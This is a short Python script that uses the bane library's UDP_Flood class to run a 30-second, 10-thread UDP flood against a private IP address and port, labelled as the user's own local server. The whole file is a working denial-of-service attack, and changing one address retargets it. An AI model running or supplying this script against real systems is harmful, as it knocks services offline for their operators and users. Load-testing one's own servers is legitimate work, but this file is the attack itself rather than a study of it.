from bane.ddos import UDP_Flood

def main():
    try:
        # Create an instance of UDP_Flood
        udp_flood = UDP_Flood(
            u="192.168.1.147",  # Target IP address (your local server)
            p=8082,  # Target port
            threads_daemon=True,  # Set threads as daemons
            interval=0.001,  # Interval between sending UDP packets
            min_size=10,  # Minimum payload size of UDP packets
            max_size=100,  # Maximum payload size of UDP packets
            connection=True,  # Maintain a connection with the target
            duration=30,  # Duration of the attack in seconds
            threads=10,  # Number of threads
            limiting=True,  # Enable rate limiting based on the interval
            logs=True  # Enable logging
        )

        print("[*] Starting UDP flood attack...")
        udp_flood.attack()  # Launch the UDP flood attack

        import time
        time.sleep(30)  # Let it run for the specified duration

        # Stop the attack manually if needed
        print("[*] Stopping UDP flood attack...")
        udp_flood.stop = True  # Graceful termination of the attack

        print("[*] UDP flood attack stopped.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    main()
